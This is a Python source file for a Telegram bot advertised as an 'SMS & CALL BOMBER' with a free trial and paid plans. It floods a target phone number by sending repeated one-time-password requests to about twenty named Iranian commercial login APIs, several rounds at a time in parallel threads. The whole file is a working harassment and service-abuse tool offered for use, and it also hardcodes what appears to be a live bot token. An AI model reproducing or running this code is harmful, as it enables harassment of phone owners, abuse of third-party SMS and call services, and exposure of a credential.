import asyncio
import concurrent.futures
import threading
from datetime import datetime, timedelta
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"  # az @BotFather begir
ADMIN_ID = 2025464333  # id adadi khodet

HDR = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
USERS = {}

def sms_apis(phone):
    return [
        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":phone}],
        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":phone[1:]}],
        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+phone[1:]}],
        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":phone}],
        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":phone,"role":"DRIVER"},"otpOption":"SMS"}],
        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+phone[1:]}],
        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":phone}],
        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":phone}],
        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":phone}],
        ["Snapp V1","https://api.snapp.ir/api/v1/sms/link",{"phone":phone}],
        ["Snapp V2","https://digitalsignup.snapp.ir/ds3/api/v3/otp?cellphone="+phone,{"cellphone":phone}],
        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":phone[1:]}],
        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":phone}],
        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":phone}],
        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":phone}],
        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":phone}],
        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":phone}],
        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":phone,"role":"BIKER"}}],
        ["Digikala SMS","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":False}],
        ["DigikalaJet SMS","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def call_apis(phone):
    return [
        ["Digikala CALL","https://api.digikala.com/v1/user/authenticate/",{"username":phone,"otp_call":True}],
        ["DigikalaJet CALL","https://api.digikalajet.ir/user/login-register/",{"phone":phone}],
    ]

def get_apis(phone, mode):
    if mode == "sms": return sms_apis(phone)
    elif mode == "call": return call_apis(phone)
    return call_apis(phone) + sms_apis(phone)

def send_one(api, uid):
    if USERS.get(uid, {}).get("stop"): return ("stop", api[0])
    name, url, data = api
    try:
        r = requests.post(url, json=data, headers=HDR, timeout=8)
        if r.status_code in (200,201,202,204,400,401,403,422,429):
            return ("ok", name)
        return ("fail", name)
    except:
        return ("err", name)

async def bomb(update, phone, rounds, mode, uid):
    USERS.setdefault(uid, {})["stop"] = False
    USERS[uid]["active"] = True
    apis = get_apis(phone, mode)
    total = len(apis) * rounds
    ok = fail = stop = 0
    msg = await update.message.reply_text(f"Bombing: {phone} | {mode}\n0/{total}")
    loop = asyncio.get_event_loop()
    for rnd in range(rounds):
        if USERS.get(uid, {}).get("stop"):
            stop += len(apis) * (rounds - rnd)
            break
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [loop.run_in_executor(ex, send_one, api, uid) for api in apis]
            for coro in asyncio.as_completed(futures):
                res = await coro
                if res[0] == "ok": ok += 1
                elif res[0] == "stop": stop += 1
                else: fail += 1
                if (ok+fail+stop) % 5 == 0:
                    try: await msg.edit_text(f"Bombing: {phone} | {mode}\nOK:{ok} FAIL:{fail} STOP:{stop}\n{ok+fail+stop}/{total}")
                    except: pass
        if rnd < rounds - 1 and not USERS.get(uid, {}).get("stop"):
            await asyncio.sleep(0.3)
    USERS[uid]["active"] = False
    await msg.edit_text(f"Done! {phone}\nOK:{ok} FAIL:{fail} STOP:{stop}")

def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SMS Bomber", callback_data="sms"),
         InlineKeyboardButton("Call Bomber", callback_data="call")],
        [InlineKeyboardButton("SMS + Call", callback_data="all"),
         InlineKeyboardButton("Stop", callback_data="stop")],
        [InlineKeyboardButton("Free Test 1 Day", callback_data="test"),
         InlineKeyboardButton("Buy Subscription", callback_data="buy")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ])

async def start(update, context):
    await update.message.reply_text("ILIYA SMS BOT\nSMS & CALL BOMBER\n\nSelect:", reply_markup=main_menu())

async def button(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data
    uid = q.from_user.id
    if d in ("sms","call","all"):
        context.user_data["mode"] = d
        await q.message.reply_text(f"Mode: {d.upper()}\nSend: PHONE ROUNDS\nExample: 09121234567 3")
    elif d == "stop":
        USERS.setdefault(uid, {})["stop"] = True
        await q.message.reply_text("Stopping...")
    elif d == "test":
        USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active": False, "stop": False}
        await q.message.reply_text("1-day trial activated!")
    elif d == "buy":
        await q.message.reply_text("Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")
    elif d == "help":
        await q.message.reply_text("1. Choose mode\n2. Send: PHONE ROUNDS\nExample: 09121234567 3\nCommands: /start /test /buy /help")

async def handle_msg(update, context):
    uid = update.effective_user.id
    text = update.message.text.strip()
    if uid != ADMIN_ID:
        expire = USERS.get(uid, {}).get("expire", datetime.min)
        if expire < datetime.now():
            await update.message.reply_text("Expired! Use /test or /buy")
            return
    mode = context.user_data.get("mode", "all")
    parts = text.split()
    if parts and parts[0].startswith("09"):
        phone = parts[0]
        rounds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
        if USERS.get(uid, {}).get("active"):
            await update.message.reply_text("Already running. Press Stop first.")
            return
        await bomb(update, phone, rounds, mode, uid)
    else:
        await update.message.reply_text("Format: 09121234567 3")

async def stop_cmd(update, context):
    uid = update.effective_user.id
    USERS.setdefault(uid, {})["stop"] = True
    await update.message.reply_text("Stop sent.")

async def test_cmd(update, context):
    uid = update.effective_user.id
    USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active": False, "stop": False}
    await update.message.reply_text("1-day trial activated!")

async def buy_cmd(update, context):
    await update.message.reply_text("Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")

async def help_cmd(update, context):
    await update.message.reply_text("1. Choose mode\n2. Send: PHONE ROUNDS\n/start /test /buy /help")

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run_health():
    HTTPServer(("0.0.0.0", 10000), HealthHandler).serve_forever()

def main():
    threading.Thread(target=run_health, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("test", test_cmd))
    app.add_handler(CommandHandler("buy", buy_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
